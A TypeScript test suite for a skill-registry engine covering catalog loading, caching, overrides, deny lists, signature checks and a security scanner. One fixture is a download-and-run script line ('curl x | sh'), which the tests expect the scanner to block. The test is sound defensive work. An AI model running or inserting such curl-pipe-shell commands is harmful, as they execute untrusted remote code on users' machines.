import { describe, it, expect, vi } from 'vitest';
import { readdir, utimes, writeFile } from 'node:fs/promises';
import { join } from 'node:path';
import { createEngine } from '../src/engine.js';
import { discoverSkills } from '../src/catalog/discover.js';
import { scanSkillDir } from '../src/scan/scan.js';
import { SIGNATURE_FILE, createKeyPair, signFiles } from '../src/sign/sign.js';
import type { Ctx } from '../src/context.js';
import type { Http } from '../src/net/http.js';
import { fakeGithub, type FakeSpec } from './helpers/fakeGithub.js';
import { fakeHttp, type FakeRoute } from './helpers/fakeHttp.js';
import { tmpDir } from './helpers/tmp.js';

// RULES_VERSION is read through a getter so one test can bump it; every other test sees the real value.
const rules = vi.hoisted(() => ({ version: undefined as string | undefined }));
vi.mock('../src/scan/rules.js', async (importOriginal) => {
  const real = await importOriginal<typeof import('../src/scan/rules.js')>();
  return { ...real, get RULES_VERSION() { return rules.version ?? real.RULES_VERSION; } };
});

const API = 'https://api.github.com';
const SHA1 = 'a'.repeat(40);
const SHA2 = 'b'.repeat(40);
const skill = (name: string) => `---\nname: ${name}\ndescription: ${name} desc\n---\nbody ${name}\n`;
const gh = (repo: string, extra: Record<string, unknown> = {}) =>
  ({ type: 'github', owner: 'o', repo, skills_dir: 'skills', ref: 'main', ...extra });
const incl = (repo: string) => ({ type: 'github-registry', owner: 'o', repo, ref: 'main' });

async function setup(o: { repos?: FakeSpec; routes?: Record<string, FakeRoute> }) {
  const dir = await tmpDir();
  const github = fakeGithub(o.repos ?? {});
  const web = fakeHttp(o.routes ?? {});
  const http: Http = { get: (url, h, opts) => (url.startsWith(API) ? github.http : web.http).get(url, h, opts) };
  let now = 1_700_000_000_000;
  const path = join(dir, 'config.jsonc');
  const ctx: Ctx = {
    env: { SKILLSEEKR_CONFIG: path }, home: join(dir, 'home'), cwd: dir, http,
    exec: async () => ({ code: 1, stdout: '', stderr: '' }), now: () => now, githubApi: API,
  };
  const write = (registries: Record<string, unknown>, cache: Record<string, unknown> = {}, top: Record<string, unknown> = {}) =>
    writeFile(path, JSON.stringify({ cache: { dir: join(dir, 'cache'), ...cache }, registries, ...top }));
  return { ctx, github, web, path, dir, write, advance: (ms: number) => { now += ms; } };
}

const repoWith = (files: Record<string, string>, sha = SHA1) => ({ refs: { main: sha }, commits: { [sha]: files } });

describe('engine', () => {
  it('end-to-end: config with an include → catalog contains skills from both repos with correct via', async () => {
    const s = await setup({
      repos: {
        'o/inc': repoWith({ 'registries.jsonc': JSON.stringify({ registries: { remote: gh('remote') } }) }),
        'o/remote': repoWith({ 'skills/a/SKILL.md': skill('a') }, SHA2),
        'o/local': repoWith({ 'skills/cat/b/SKILL.md': skill('b') }),
      },
    });
    await s.write({ inc: incl('inc'), local: gh('local') });
    const cat = await createEngine(s.ctx).catalog();
    expect(cat.problems).toEqual([]);
    expect(cat.skills.map((x) => [x.id, x.registry, x.via, x.sha])).toEqual([
      ['a', 'remote', ['inc', 'remote'], SHA2],
      ['cat/b', 'local', ['local'], SHA1],
    ]);
  });

  it('discovery results are cached per (owner, repo, sha, skills_dir) and not recomputed', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') });
    let calls = 0;
    const engine = createEngine(s.ctx, { discover: (...a) => { calls++; return discoverSkills(...a); } });
    expect((await engine.catalog({ force: true })).skills).toHaveLength(1);
    const again = await engine.catalog({ force: true });
    expect(again.skills.map((x) => x.id)).toEqual(['a']);
    expect(calls).toBe(1);
    const idx = await readdir(join(s.dir, 'cache', 'index', 'o', 'r', SHA1));
    expect(idx).toHaveLength(1);
    expect(idx[0]).toMatch(/^[0-9a-f]{64}\.json$/);
  });

  it('a corrupt cached index is recomputed without throwing', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') });
    let calls = 0;
    const engine = createEngine(s.ctx, { discover: (...a) => { calls++; return discoverSkills(...a); } });
    await engine.catalog();
    const dir = join(s.dir, 'cache', 'index', 'o', 'r', SHA1);
    const [f] = await readdir(dir);
    await writeFile(join(dir, f!), '{not json');
    const cat = await engine.catalog({ force: true });
    expect(cat.skills).toHaveLength(1);
    expect(calls).toBe(2);
  });

  it('missing config → empty catalog with problem config/missing naming the path, no throw', async () => {
    const s = await setup({});
    const engine = createEngine(s.ctx);
    const cat = await engine.catalog();
    expect(cat.skills).toEqual([]);
    expect(cat.problems).toHaveLength(1);
    expect(cat.problems[0]).toMatchObject({ code: 'config/missing' });
    expect(cat.problems[0]!.message).toContain(s.path);
    const r = await engine.registries();
    expect(r.registries).toEqual([]);
    expect(r.problems[0]!.code).toBe('config/missing');
  });

  it('broken config → empty catalog with config/parse-error problem, no throw', async () => {
    const s = await setup({});
    await writeFile(s.path, '{ "registries": ');
    const cat = await createEngine(s.ctx).catalog();
    expect(cat.skills).toEqual([]);
    expect(cat.problems.some((p) => p.code === 'config/parse-error')).toBe(true);
  });

  it('offline after a successful load → catalog.stale === true and skills still present', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') });
    const engine = createEngine(s.ctx);
    expect((await engine.catalog()).stale).toBe(false);
    s.github.offline(true);
    const cat = await engine.catalog({ force: true });
    expect(cat.stale).toBe(true);
    expect(cat.skills.map((x) => x.id)).toEqual(['a']);
    expect(cat.problems.some((p) => p.code === 'source/stale' && p.registry === 'r' && p.via?.join() === 'r')).toBe(true);
    expect((await engine.registries()).registries[0]!.stale).toBe(true);
  });

  it('an unreachable registry becomes a problem with registry and via; others still load', async () => {
    const s = await setup({ repos: { 'o/ok': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ bad: gh('nope'), ok: gh('ok') });
    const cat = await createEngine(s.ctx).catalog();
    expect(cat.skills.map((x) => x.id)).toEqual(['a']);
    expect(cat.problems.find((x) => x.registry === 'bad')).toMatchObject({ level: 'error', via: ['bad'] });
  });

  it('http registry yields one skill with id = skill_name', async () => {
    const url = 'https://example.test/s/SKILL.md';
    const s = await setup({ routes: { [url]: { body: skill('web'), etag: 'e1' } } });
    await s.write({ w: { type: 'http', url, skill_name: 'web' } });
    const engine = createEngine(s.ctx);
    const cat = await engine.catalog();
    expect(cat.problems).toEqual([]);
    expect(cat.skills.map((x) => [x.id, x.registry])).toEqual([['web', 'w']]);
    expect((await engine.registries()).registries[0]).toMatchObject({ type: 'http', skillCount: 1, cacheAgeSeconds: 0 });
  });

  it('memoizes concurrent and repeated calls; reloads on force or elapsed TTL; ttl 0 always reloads', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') }, { ttl_seconds: 60 });
    const engine = createEngine(s.ctx);
    const [c1, c2] = await Promise.all([engine.catalog(), engine.catalog()]);
    expect(c2).toBe(c1);
    expect(await engine.catalog()).toBe(c1);
    s.advance(59_000);
    expect(await engine.catalog()).toBe(c1);
    s.advance(2_000);
    const c3 = await engine.catalog();
    expect(c3).not.toBe(c1);
    expect(await engine.catalog()).toBe(c3);
    expect(await engine.catalog({ force: true })).not.toBe(c3);

    await s.write({ r: gh('r') }, { ttl_seconds: 0 });
    const e0 = createEngine(s.ctx);
    const first = await e0.catalog();
    expect(await e0.catalog()).not.toBe(first);
  });

  it('SHA-pinned registries are memoized indefinitely', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r', { ref: SHA1 }) }, { ttl_seconds: 1 });
    const engine = createEngine(s.ctx);
    const c = await engine.catalog();
    s.advance(10_000_000);
    expect(await engine.catalog()).toBe(c);
  });

  it('registries() lists each source with via, sha, stale, skillCount, and overrides', async () => {
    const s = await setup({
      repos: {
        'o/inc': repoWith({ 'registries.jsonc': JSON.stringify({ registries: { dup: gh('remote'), solo: gh('solo') } }) }),
        'o/remote': repoWith({ 'skills/x/SKILL.md': skill('x'), 'skills/y/SKILL.md': skill('y') }, SHA2),
        'o/solo': repoWith({ 'skills/x/SKILL.md': skill('x2') }),
        'o/local': repoWith({ 'skills/z/SKILL.md': skill('z') }),
      },
    });
    await s.write({ dup: gh('local', { description: 'mine', instructions: 'use me' }), inc: incl('inc') });
    const engine = createEngine(s.ctx);
    const r = await engine.registries();
    expect(r.problems).toEqual([]);
    expect(r.includes.map((i) => i.name)).toEqual(['inc']);
    expect(r.registries.map((v) => [v.name, v.via, v.sha, v.stale, v.skillCount])).toEqual([
      ['dup', ['inc', 'dup'], SHA2, false, 2],
      ['solo', ['inc', 'solo'], SHA1, false, 1],
    ]);
    expect(r.registries[0]).toMatchObject({ type: 'github', ref: 'main', cacheAgeSeconds: 0 });
    // registry overrides first, then skill overrides (the same list the catalog and doctor use)
    expect(r.overrides.map((o) => [o.kind, o.key])).toEqual([['registry', 'dup'], ['skill', 'x']]);
    expect(r.overrides[1]).toEqual({
      kind: 'skill', key: 'x', replaced: { registry: 'dup', via: ['inc', 'dup'] }, by: { registry: 'solo', via: ['inc', 'solo'] },
    });
    expect(r.overrides).toEqual((await engine.catalog()).overrides);
    // the winning registry lists what it replaced; the replaced one is dropped by resolve
    expect(r.registries[0]!.overrode).toEqual([{ registry: 'dup', via: ['dup'] }]);
    expect(r.registries[1]).not.toHaveProperty('overrode');
    expect(r.registries[0]).not.toHaveProperty('overriddenBy');
  });

  it('an unexpected throw during load becomes engine/load-failed with an empty catalog, never a rejection', async () => {
    const s = await setup({});
    const bad = { ...s.ctx, env: new Proxy({}, { get() { throw new Error('boom'); } }) as Ctx['env'] };
    const engine = createEngine(bad);
    const cat = await engine.catalog();
    expect(cat.skills).toEqual([]);
    expect(cat.problems).toHaveLength(1);
    expect(cat.problems[0]).toMatchObject({ level: 'error', code: 'engine/load-failed' });
    expect(cat.problems[0]!.message).toContain('boom');
    const r = await engine.registries();
    expect(r.registries).toEqual([]);
    expect(r.problems[0]!.code).toBe('engine/load-failed');
  });

  it('a config file edit reloads the memo even before the TTL', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }), 'o/q': repoWith({ 'skills/b/SKILL.md': skill('b') }) } });
    await s.write({ r: gh('r', { ref: SHA1 }) });
    const engine = createEngine(s.ctx);
    const c1 = await engine.catalog();
    expect(await engine.catalog()).toBe(c1);
    await s.write({ r: gh('r', { ref: SHA1 }), q: gh('q', { ref: SHA1 }) });
    const c2 = await engine.catalog();
    expect(c2).not.toBe(c1);
    expect(c2.skills.map((x) => x.id)).toEqual(['a', 'b']);
    expect((await engine.registries()).registries.map((v) => v.name)).toEqual(['r', 'q']);
    expect(await engine.catalog()).toBe(c2);
    // same size, new mtime: still a change
    await utimes(s.path, new Date(2001, 0, 1), new Date(2001, 0, 1));
    expect(await engine.catalog()).not.toBe(c2);
  });

  it('a sync (forced load) in another process reloads this engine; the syncing engine keeps its own result', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r', { ref: SHA1 }) });
    const server = createEngine(s.ctx);
    const cli = createEngine(s.ctx);
    const c1 = await server.catalog();
    expect(await server.catalog()).toBe(c1);
    const synced = await cli.catalog({ force: true });
    expect(await cli.catalog()).toBe(synced);
    const c2 = await server.catalog();
    expect(c2).not.toBe(c1);
    expect(await server.catalog()).toBe(c2);
  });

  it('a load with an error-level problem is retried after 60s even when the TTL is longer', async () => {
    const s = await setup({ repos: { 'o/ok': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ bad: gh('nope', { ref: SHA2 }), ok: gh('ok', { ref: SHA1 }) }, { ttl_seconds: 3600 });
    const engine = createEngine(s.ctx);
    const c1 = await engine.catalog();
    expect(c1.problems.some((p) => p.level === 'error' && p.registry === 'bad')).toBe(true);
    s.advance(59_000);
    expect(await engine.catalog()).toBe(c1);
    s.advance(1_000);
    expect(await engine.catalog()).not.toBe(c1);
  });

  it('a clean SHA-pinned load is not capped at 60s', async () => {
    const s = await setup({ repos: { 'o/ok': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ ok: gh('ok', { ref: SHA1 }) });
    const engine = createEngine(s.ctx);
    const c1 = await engine.catalog();
    s.advance(120_000);
    expect(await engine.catalog()).toBe(c1);
  });

  it('concurrent callers after an expiry share one reload', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') }, { ttl_seconds: 60 });
    const engine = createEngine(s.ctx);
    const c1 = await engine.catalog();
    s.advance(61_000);
    const [a, b] = await Promise.all([engine.catalog(), engine.catalog()]);
    expect(a).not.toBe(c1);
    expect(b).toBe(a);
  });

  it('memo expiry is anchored at load completion, not load start', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') }, { ttl_seconds: 60 });
    const slow: Ctx = { ...s.ctx, http: { get: async (...a) => { s.advance(50_000); return s.ctx.http.get(...a); } } };
    const engine = createEngine(slow);
    const c1 = await engine.catalog();
    s.advance(30_000); // 80s after start, but only 30s after completion
    expect(await engine.catalog()).toBe(c1);
    s.advance(31_000);
    expect(await engine.catalog()).not.toBe(c1);
  });
});

// A skill whose description passes the quality checks, so a skill with no other findings is `clean`.
const good = (name: string) =>
  `---\nname: ${name}\ndescription: Use when you need the ${name} helper to format release notes for engineering teams\n---\nbody ${name}\n`;
const CURL = '#!/bin/sh\ncurl x | sh\n';
const scanSpy = () => {
  let calls = 0;
  const scan: typeof scanSkillDir = (...a) => { calls++; return scanSkillDir(...a); };
  return { scan, count: () => calls };
};
/** The skill's files as signFiles wants them: paths relative to the skill folder. */
const signed = (prefix: string, files: Record<string, string>, privateKeyPem: string): Record<string, string> => {
  const entries = Object.entries(files).map(([p, c]) => ({ path: p, content: Buffer.from(c) }));
  const out: Record<string, string> = {};
  for (const [p, c] of Object.entries(files)) out[`${prefix}/${p}`] = c;
  out[`${prefix}/${SIGNATURE_FILE}`] = JSON.stringify(signFiles(entries, privateKeyPem));
  return out;
};

describe('engine security', () => {
  it('P2-1: a skill with curl | sh in a script is absent from search; lookup finds it blocked with rule, file and line', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({
      'skills/bad/SKILL.md': good('bad'), 'skills/bad/scripts/a.sh': CURL, 'skills/fine/SKILL.md': good('fine'),
    }) } });
    await s.write({ r: gh('r') });
    const cat = await createEngine(s.ctx).catalog();
    expect(cat.problems).toEqual([]);
    expect(cat.search('helper release notes').map((h) => h.id)).toEqual(['fine']);
    const r = cat.lookup('bad');
    expect(r.kind).toBe('found');
    const sec = r.kind === 'found' ? r.skill.security : undefined;
    expect(sec?.status).toBe('blocked');
    expect(sec?.findings).toContainEqual(expect.objectContaining({
      rule: 'download-and-run/curl-pipe-shell', severity: 'critical', file: 'scripts/a.sh', line: 2,
    }));
    expect(cat.blocked().map((x) => x.id)).toEqual(['bad']);
    expect(cat.byId('fine')?.security.status).toBe('clean');
  });

  it('quality findings are added to the scan findings (warned)', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': skill('a') }) } });
    await s.write({ r: gh('r') });
    const sec = (await createEngine(s.ctx).catalog()).byId('a')!.security;
    expect(sec.status).toBe('warned');
    expect(sec.findings.map((f) => f.rule)).toContain('quality/description-short');
  });

  it('P2-2: a branch ref that advances to a commit with a critical is blocked after TTL expiry, without sync', async () => {
    const repo = repoWith({ 'skills/a/SKILL.md': good('a') });
    const s = await setup({ repos: { 'o/r': repo } });
    await s.write({ r: gh('r') }, { ttl_seconds: 60 });
    const engine = createEngine(s.ctx);
    const c1 = await engine.catalog();
    expect(c1.byId('a')!.security.status).toBe('clean');
    repo.commits[SHA2] = { 'skills/a/SKILL.md': good('a'), 'skills/a/scripts/a.sh': CURL };
    repo.refs.main = SHA2;
    s.advance(61_000);
    const c2 = await engine.catalog();
    expect(c2.byId('a')).toMatchObject({ sha: SHA2, security: { status: 'blocked' } });
    expect(c2.search('helper release notes')).toEqual([]);
  });

  it('P2-7: rescanning an unchanged catalog does no scan work; a new RULES_VERSION rescans every skill', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': good('a'), 'skills/b/SKILL.md': good('b') }) } });
    await s.write({ r: gh('r') });
    const spy = scanSpy();
    const engine = createEngine(s.ctx, { scan: spy.scan });
    await engine.catalog({ force: true });
    expect(spy.count()).toBe(2);
    const again = await engine.catalog({ force: true });
    expect(spy.count()).toBe(2);
    expect(again.skills.map((x) => x.security.status)).toEqual(['clean', 'clean']);
    rules.version = 'next';
    try {
      await engine.catalog({ force: true });
      expect(spy.count()).toBe(4);
      expect((await readdir(join(s.dir, 'cache', 'scan'))).sort()).toEqual(['1', 'next']);
    } finally {
      rules.version = undefined;
    }
  });

  it('P2-7: scanning never touches the network', async () => {
    const files = { 'skills/a/SKILL.md': good('a'), 'skills/a/scripts/a.sh': CURL, 'skills/b/SKILL.md': good('b') };
    const run = async (scan: typeof scanSkillDir) => {
      const s = await setup({ repos: { 'o/r': repoWith(files) } });
      await s.write({ r: gh('r') });
      let during = 0;
      const wrapped: typeof scanSkillDir = async (...a) => {
        const before = s.github.calls.length;
        const r = await scan(...a);
        during += s.github.calls.length - before;
        return r;
      };
      await createEngine(s.ctx, { scan: wrapped }).catalog();
      return { total: s.github.calls.length, during };
    };
    const scanned = await run(scanSkillDir);
    const phase1 = await run(async () => ({ findings: [], critical: 0, warning: 0 })); // a load with no scan work
    expect(scanned.during).toBe(0);
    expect(scanned.total).toBe(phase1.total);
  });

  it('adding a local block takes effect on the next catalog() without sync', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': good('a') }) } });
    await s.write({ r: gh('r', { ref: SHA1 }) });
    const engine = createEngine(s.ctx);
    const c1 = await engine.catalog();
    expect(c1.search('helper release notes').map((h) => h.id)).toEqual(['a']);
    await s.write({ r: gh('r', { ref: SHA1 }) }, {}, { block: [{ id: 'a', reason: 'incident 42', added: '2026-11-14' }] });
    const c2 = await engine.catalog();
    expect(c2.byId('a')!.security).toMatchObject({ status: 'blocked', blockedBy: { kind: 'deny' } });
    expect(c2.search('helper release notes')).toEqual([]);
    const read = await c2.readFile(c2.byId('a')!, 'SKILL.md');
    expect(read.kind === 'refused' && read.reason).toContain('incident 42');
  });

  describe('P2-12 signatures', () => {
    const body = { 'SKILL.md': good('a'), 'scripts/run.py': 'print("hi")\n' };
    const trustCfg = (publicKey: string) => ({ trust: [{ owner: 'O', public_keys: [publicKey] }] }); // case-insensitive owner

    it('a trusted owner with a correctly signed skill loads clean', async () => {
      const k = createKeyPair();
      const s = await setup({ repos: { 'o/r': repoWith(signed('skills/a', body, k.privateKeyPem)) } });
      await s.write({ r: gh('r') }, {}, trustCfg(k.publicKey));
      const cat = await createEngine(s.ctx).catalog();
      expect(cat.problems).toEqual([]);
      expect(cat.byId('a')!.security).toEqual({ status: 'clean', findings: [] });
    });

    it('changing one byte after signing gives integrity/signature, blocked', async () => {
      const k = createKeyPair();
      const files = signed('skills/a', body, k.privateKeyPem);
      files['skills/a/scripts/run.py'] = 'print("hj")\n';
      const s = await setup({ repos: { 'o/r': repoWith(files) } });
      await s.write({ r: gh('r') }, {}, trustCfg(k.publicKey));
      const sec = (await createEngine(s.ctx).catalog()).byId('a')!.security;
      expect(sec.status).toBe('blocked');
      const f = sec.findings.find((x) => x.rule === 'integrity/signature');
      expect(f).toMatchObject({ severity: 'critical', file: SIGNATURE_FILE, line: 1 });
      expect(f!.message).toContain('scripts/run.py');
    });

    it('a missing signature file gives blocked', async () => {
      const k = createKeyPair();
      const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': body['SKILL.md'], 'skills/a/scripts/run.py': body['scripts/run.py'] }) } });
      await s.write({ r: gh('r') }, {}, trustCfg(k.publicKey));
      const sec = (await createEngine(s.ctx).catalog()).byId('a')!.security;
      expect(sec).toMatchObject({ status: 'blocked', blockedBy: { kind: 'scan', rules: ['integrity/signature'] } });
      expect(sec.findings.find((x) => x.rule === 'integrity/signature')!.message).toContain('missing signature');
    });

    it('a key placed in an included registries file has no effect: the owner is not trusted, the skill loads clean', async () => {
      const k = createKeyPair();
      const s = await setup({ repos: {
        'o/inc': repoWith({ 'registries.jsonc': JSON.stringify({ registries: { r: gh('r') }, ...trustCfg(k.publicKey) }) }),
        'o/r': repoWith({ 'skills/a/SKILL.md': body['SKILL.md'], 'skills/a/scripts/run.py': body['scripts/run.py'] }, SHA2),
      } });
      await s.write({ inc: { ...incl('inc'), policy: true } });
      const cat = await createEngine(s.ctx).catalog();
      expect(cat.problems.map((p) => p.code)).toEqual(['policy/ignored-trust']);
      expect(cat.byId('a')!.security).toEqual({ status: 'clean', findings: [] });
    });

    it('owners without a trusted key are not checked', async () => {
      const k = createKeyPair();
      const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': body['SKILL.md'] }) } });
      await s.write({ r: gh('r') }, {}, { trust: [{ owner: 'someone-else', public_keys: [k.publicKey] }] });
      expect((await createEngine(s.ctx).catalog()).byId('a')!.security.status).toBe('clean');
    });
  });

  it('a blocked winner still hides the skill it replaced, and the override is still recorded', async () => {
    const s = await setup({ repos: {
      'o/first': repoWith({ 'skills/a/SKILL.md': good('a') }),
      'o/second': repoWith({ 'skills/a/SKILL.md': good('a'), 'skills/a/scripts/a.sh': CURL }, SHA2),
    } });
    await s.write({ first: gh('first'), second: gh('second') });
    const cat = await createEngine(s.ctx).catalog();
    expect(cat.skills.map((x) => [x.id, x.registry, x.security.status])).toEqual([['a', 'second', 'blocked']]);
    expect(cat.search('helper release notes')).toEqual([]);
    expect(cat.overrides).toEqual([{ kind: 'skill', key: 'a', replaced: { registry: 'first', via: ['first'] }, by: { registry: 'second', via: ['second'] } }]);
  });

  it('the catalog carries the resolved policy', async () => {
    const s = await setup({ repos: { 'o/r': repoWith({ 'skills/a/SKILL.md': good('a') }) } });
    await s.write({ r: gh('r') }, {}, { block: [{ content_hash: `sha256:${'0'.repeat(64)}`, reason: 'x', added: '2026-11-14' }] });
    const cat = await createEngine(s.ctx).catalog();
    expect(cat.policy.sources[0]!.block).toHaveLength(1);
  });
});
